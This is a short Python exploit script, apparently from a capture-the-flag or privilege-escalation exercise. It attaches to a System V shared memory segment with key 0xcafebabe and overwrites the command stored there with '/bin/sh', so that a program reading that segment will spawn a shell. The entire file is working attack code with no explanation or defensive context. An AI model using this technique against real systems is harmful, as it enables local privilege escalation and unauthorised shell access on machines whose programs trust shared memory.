import sys
import ctypes
import time
from sysv_ipc import SharedMemory

SHM_KEY = 0xcafebabe

try:
    # Attach to shared memory
    shm = SharedMemory(SHM_KEY)
    
    print(f"Attached to shared memory ID: {shm.id}")

    # Wait for the program to write the command
    #time.sleep(1)

    
    new_command = b"/bin/sh\x00"  # Must be null-terminated
    shm.write(new_command, 0)

    print("[+] Shared memory modified successfully!")

except Exception as e:
    print(f"Error: {e}")

